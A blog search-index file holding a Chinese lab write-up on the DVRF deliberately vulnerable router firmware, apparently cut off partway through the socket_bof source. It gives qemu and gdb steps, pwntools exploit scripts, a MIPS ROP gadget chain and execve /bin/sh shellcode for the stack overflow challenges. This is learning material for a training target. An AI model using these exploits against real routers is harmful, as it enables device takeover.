<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DVRF路由器漏洞靶机题目笔记</title>
      <link href="archives/6f13cd09/"/>
      <url>archives/6f13cd09/</url>
      
        <content type="html"><![CDATA[<h2 id="DVRF-项目介绍"><a href="#DVRF-项目介绍" class="headerlink" title="DVRF 项目介绍"></a>DVRF 项目介绍</h2><p>该项目目标是模拟一个真实的环境，帮助人们了解 x86_64 之外的其他 CPU 架构。此固件是针对 Linksys E1550 设备量身定制的。如果您没有，请不要担心！可以用 qemu 模拟。</p><p>项目地址：<a href="https://github.com/praetorian-inc/DVRF">https://github.com/praetorian-inc/DVRF</a></p><h2 id="模拟环境"><a href="#模拟环境" class="headerlink" title="模拟环境"></a>模拟环境</h2><p>主要是用 ubuntu 16 ，如果部分题目用 qemu-user 模拟不了，就转去 attify 3.0 。但是 attify gdb 插件 gef 视乎在模拟时 vmmap 查不过来 libc 地址，问题不大只是查询方法饶了一点，还是可以解决的。</p><ul><li>ubuntu 16.04<ul><li>pwndbg</li><li>Qemu-static(version 2.11.1)</li><li>gdb-multiarch</li></ul></li><li>attify 3.0<ul><li>下载地址：<a href="https://github.com/adi0x90/attifyos">https://github.com/adi0x90/attifyos</a></li></ul></li></ul><h2 id="stack-bof-01"><a href="#stack-bof-01" class="headerlink" title="stack_bof_01"></a>stack_bof_01</h2><p>获取参数后，未校验长度赋值给局部变量造成栈溢出，有后门函数 <code>0x00400950</code> ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210311234221.png" alt="image-20210311234221215"></p><p>Main 函数由 libc_main_start 调用，即 main 函数为<strong>非叶子函数</strong>，返回地址存放在栈上，从汇编可见：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210311234457.png" alt="image-20210311234457308"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210311234516.png" alt="image-20210311234516201"></p><p>直接跳转 0x00400950 会因为 t9 的值被修改而错误。<strong>mips默认 t9 为当前函数开始地址。函数内部通过 t9 寄存器和 gp 寄存器来找数据，地址等。</strong></p><p>其他师傅文章中是通过找 libc 中的 <code>lw $t9, arg_0($sp);jalr $t9</code> 调整 t9 寄存器。但是我固件镜像中的 libc 没有这个 gadget ，按照偏移地址跳转过去是 <code>jalr $t9</code> 。换个思路直接跳过 dat_shell 开头调整 gp 部分：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210312111808.png" alt="image-20210312111802336"></p><p>修复 t9 寄存器思路参考师傅文章：<a href="https://www.cnblogs.com/hac425/p/9416758.html">https://www.cnblogs.com/hac425/p/9416758.html</a></p><h3 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h3><p>需要打开几个 terminal 启动不同的命令：</p><ul><li><p>启动 qemu 模拟</p><blockquote><p>-strace 查看 qemu 调试信息，方便观察执行了什么命令</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel-static -L . -g 1234 -strace ./pwnable/Intro/uaf_01 aaaa</span><br></pre></td></tr></table></figure></li><li><p>gdb-multiarch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./pwnable/Intro/stack_bof_01</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> architecture mips</span><br><span class="line"><span class="built_in">set</span> endian little</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure></li></ul><p>连上之后会停在 start ，在 main 函数开头打断点，运行到这个断点，然后就慢慢单步调试。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>字符串是从参数读入，跳转地址转换后是不可见字符 ，需要借助 <code>cat</code> 传入参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file_name: stack_bof_01.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;./pwnable/Intro/stack_bof_01&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0040095c</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xc8</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload += p32(backdoor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;stack_bof_01_payload&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">file.write(payload)</span><br></pre></td></tr></table></figure><p>命令行执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 <span class="string">&quot;`cat stack_bof_01_payload`&quot;</span></span><br></pre></td></tr></table></figure><h2 id="stack-bof-02"><a href="#stack-bof-02" class="headerlink" title="stack_bof_02"></a>stack_bof_02</h2><p>和前面一题差不多，调试方法也一样，就是少了后门函数，造成溢出函数变成了 <code>strcpy</code> ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210312174644.png" alt="image-20210312174639280"></p><p>main 非叶子函数覆盖函数返回地址跳转存放在栈上的 shellocde 。qemu 模拟地址没有随机化，相当于 aslr 关闭了，直接调试查出 v4 的内存地址</p><blockquote><p>Shellcode 查询：<a href="http://shell-storm.org/shellcode/files/shellcode-792.php">http://shell-storm.org/shellcode/files/shellcode-792.php</a></p></blockquote><p>直接写入 shellcode 可以完整执行完，但是执行 <code>syscall 0x40404</code> 之后没有弹 shell 而是进行运行到下一条指令。问了师傅说也有遇到过这种情况，通过加无意义的指令(nop)调整 shellcode 位置有机会能成，用了 <code>XOR $t1, $t1, $t1</code> 避免 strcpy <code>\x00</code> 截断（只有不包含截断符指令都行），尝试后无果。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210312182503.png" alt="image-20210312182502998"></p><p>查阅资料后发现，由于 mips 是流水指令集，存在 cache incoherency 的特性，需要调用 sleep 或者其他函数将数据区刷新到当前指令区中去，才能正常执行 shellcode 。</p><blockquote><p><a href="https://ctf-wiki.org/pwn/linux/mips/mips_rop/#2-dvrf-stack_bof_02c">https://ctf-wiki.org/pwn/linux/mips/mips_rop/#2-dvrf-stack_bof_02c</a></p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210312200133.png" alt="image-20210312200133500"></p><p>构造 ROP 的 gadget 得去 libc 找，程序自身没多少个。我在 ubuntu18 gdb 连上报错，换到 ubuntu16 vmmap 查不出来 libc 信息（如图），最后换 attify 解决问题。</p><blockquote><p>libc路径：/squashfs-root/lib/libc.so.0</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210313011756.png" alt="image-20210313011756132"></p><p>先调用 sleep(1) 就需要找 gadget 控制参数以及跳转。<code>mipsrop.find(&quot;li $a0,1&quot;)</code> 控制第一个参数，任选一个后面 rop 没有 gadget 继续构造就换一个 -。-  ，我选着第二个构造 <code>gadget1 = 0x2FB10</code> ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210313002948.png" alt="image-20210313002948429"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0002FB10                 li      $a0, 1</span><br><span class="line">.text:0002FB14                 move    $t9, $s1</span><br><span class="line">.text:0002FB18                 jalr    $t9 ; sub_2F818</span><br></pre></td></tr></table></figure><p>接着需要找一个控制 s1 的 gadget ，用于控制执行完 gadget1 之后跳转到哪里。<code>mipsrop.find(&quot;li $s1&quot;)</code> 结果有很多，最后选了 <code>gadget2 = 0x00007730</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00007730                 lw      $ra, 0x18+var_s10($sp)</span><br><span class="line">.text:00007734                 lw      $s3, 0x18+var_sC($sp)</span><br><span class="line">.text:00007738                 lw      $s2, 0x18+var_s8($sp)</span><br><span class="line">.text:0000773C                 lw      $s1, 0x18+var_s4($sp)</span><br><span class="line">.text:00007740                 lw      $s0, 0x18+var_s0($sp)</span><br><span class="line">.text:00007744                 jr      $ra</span><br></pre></td></tr></table></figure><p>至此 <strong>a0 被控制为 1</strong> ，目前 payload 结构为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;????&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br></pre></td></tr></table></figure><p>不能直接将 sleep(0x767142b0) 填到 s1 处，因为直接填地址跳转 sleep 缺少了跳转前将返回地址放到 ra 寄存器（或压栈）的过程，当 sleep 运行到结尾的 <code>jalr $ra</code> 时，又会跳转会到 gadget1 ，所以要换个方式。</p><p><code>mipsrop.tails()</code> 找通过 s0\s2\s3 寄存器跳转的 gadget ，选择了 <code>gadget3 = 0x00020F1C</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00020F1C                 move    $t9, $s2</span><br><span class="line">.text:00020F20                 lw      $ra, 0x18+var_sC($sp)</span><br><span class="line">.text:00020F24                 lw      $s2, 0x18+var_s8($sp)</span><br><span class="line">.text:00020F28                 lw      $s1, 0x18+var_s4($sp)</span><br><span class="line">.text:00020F2C                 lw      $s0, 0x18+var_s0($sp)</span><br><span class="line">.text:00020F30                 jr      $t9</span><br></pre></td></tr></table></figure><p>解决 sleep 运行结束返回地址问题，并 <code>lw $ra, 0x18+var_sC($sp)</code> 控制下一层跳转，payload 结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;????&quot;</span><span class="comment">#ra</span></span><br></pre></td></tr></table></figure><p><code>mipsrop.stackfinders()</code> 找一个 gadget 提取栈地址放到寄存器中，找的时候还要注意控制下一次跳转选择 <code>gadget4 = 0x16dd0</code>  这个，通过 gadget3 提前将下次跳转地址写入 s0 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00016DD0                 addiu   $a0, $sp, 0x38+var_20</span><br><span class="line">.text:00016DD4                 move    $t9, $s0</span><br><span class="line">.text:00016DD8                 jalr    $t9</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += <span class="string">&quot;????&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += p32(gadget4)<span class="comment">#ra</span></span><br></pre></td></tr></table></figure><p>最后找一个用 a0 跳转的 gadget ，一开始用 <code>mipsrop.tails()</code> 没找到，最后用 <code>mipsrop.find(&quot;move $t9,$a0)&quot;)</code> 找着了 <code>gadget5 = 0x214a0</code> ，对 mipsrop 理解不够……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:000214A0                 move    $t9, $a0</span><br><span class="line">.text:000214A4                 sw      $v0, 0x30+var_18($sp)</span><br><span class="line">.text:000214A8                 jalr    $t9</span><br></pre></td></tr></table></figure><p>最后跳转 shellcode 时，<code>0x000214A4</code> 的这句汇编 <code>sw $v0, 0x30+var_18($sp)</code> 会将 shellcode 第一个指令替换为 nop ，用无意义指令填充，将 shellcode 向后移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(gadget5)<span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += p32(gadget4)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += shellcode</span><br></pre></td></tr></table></figure><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;./pwnable/ShellCode_Required/stack_bof_02&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_base = 0x766e5000</span></span><br><span class="line">sleep = <span class="number">0x767142b0</span><span class="comment">#0x2F2B0+0x766e5000</span></span><br><span class="line">gadget1 = <span class="number">0x76714b10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x76714b10:lia0,1</span></span><br><span class="line"><span class="string">   0x76714b14:movet9,s1</span></span><br><span class="line"><span class="string">   0x76714b18:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget2 = <span class="number">0x766ec730</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x766ec730:lwra,40(sp)</span></span><br><span class="line"><span class="string">   0x766ec734:lws3,36(sp)</span></span><br><span class="line"><span class="string">   0x766ec738:lws2,32(sp)</span></span><br><span class="line"><span class="string">   0x766ec73c:lws1,28(sp)</span></span><br><span class="line"><span class="string">   0x766ec740:lws0,24(sp)</span></span><br><span class="line"><span class="string">   0x766ec744:jrra</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget3 = <span class="number">0x76705f1c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x76705f1c:movet9,s2</span></span><br><span class="line"><span class="string">   0x76705f20:lwra,36(sp)</span></span><br><span class="line"><span class="string">   0x76705f24:lws2,32(sp)</span></span><br><span class="line"><span class="string">   0x76705f28:lws1,28(sp)</span></span><br><span class="line"><span class="string">   0x76705f2c:lws0,24(sp)</span></span><br><span class="line"><span class="string">   0x76705f30:jrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget4 = <span class="number">0x766fbdd0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x766fbdd0:addiua0,sp,24</span></span><br><span class="line"><span class="string">   0x766fbdd4 &lt;optarg&gt;:movet9,s0</span></span><br><span class="line"><span class="string">   0x766fbdd8:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget5 = <span class="number">0x767064a0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x767064a0:movet9,a0</span></span><br><span class="line"><span class="string">   0x767064a4:swv0,24(sp)</span></span><br><span class="line"><span class="string">   0x767064a8:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = <span class="string">&quot;\xff\xff\x06\x28&quot;</span>  <span class="comment"># slti $a2, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">&quot;\x62\x69\x0f\x3c&quot;</span>  <span class="comment"># lui $t7, 0x6962</span></span><br><span class="line">shellcode += <span class="string">&quot;\x2f\x2f\xef\x35&quot;</span>  <span class="comment"># ori $t7, $t7, 0x2f2f</span></span><br><span class="line">shellcode += <span class="string">&quot;\xf4\xff\xaf\xaf&quot;</span>  <span class="comment"># sw $t7, -0xc($sp)</span></span><br><span class="line">shellcode += <span class="string">&quot;\x73\x68\x0e\x3c&quot;</span>  <span class="comment"># lui $t6, 0x6873</span></span><br><span class="line">shellcode += <span class="string">&quot;\x6e\x2f\xce\x35&quot;</span>  <span class="comment"># ori $t6, $t6, 0x2f6e</span></span><br><span class="line">shellcode += <span class="string">&quot;\xf8\xff\xae\xaf&quot;</span>  <span class="comment"># sw $t6, -8($sp)</span></span><br><span class="line">shellcode += <span class="string">&quot;\xfc\xff\xa0\xaf&quot;</span>  <span class="comment"># sw $zero, -4($sp)</span></span><br><span class="line">shellcode += <span class="string">&quot;\xf5\xff\xa4\x27&quot;</span>  <span class="comment"># addiu $a0, $sp, -0xc</span></span><br><span class="line">shellcode += <span class="string">&quot;\xff\xff\x05\x28&quot;</span>  <span class="comment"># slti $a1, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">&quot;\xab\x0f\x02\x24&quot;</span>  <span class="comment"># addiu;$v0, $zero, 0xfab</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0c\x01\x01\x01&quot;</span>  <span class="comment"># syscall 0x40404</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(gadget5)<span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += p32(gadget4)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;stack_bof_02_payload&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">file.write(payload)</span><br></pre></td></tr></table></figure><h2 id="socket-bof"><a href="#socket-bof" class="headerlink" title="socket_bof"></a>socket_bof</h2><p>这题二进制文件用 ida 看伪代码有点瑕疵，本来溢出点变成了一个指针，导致一直找不到，最后无奈去看了下源码和结合汇编。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Pwnable Socket Program</span></span><br><span class="line"><span class="comment">// By b1ack0wl</span></span><br><span class="line"><span class="comment">// Stack Overflow</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt;<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: %s port_number - by b1ack0wl\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">500</span>] = <span class="string">&quot;\0&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> endstr[<span class="number">50</span>] = <span class="string">&quot;\0&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> listen_fd, comm_fd;</span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> option = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line"> </span><br><span class="line">  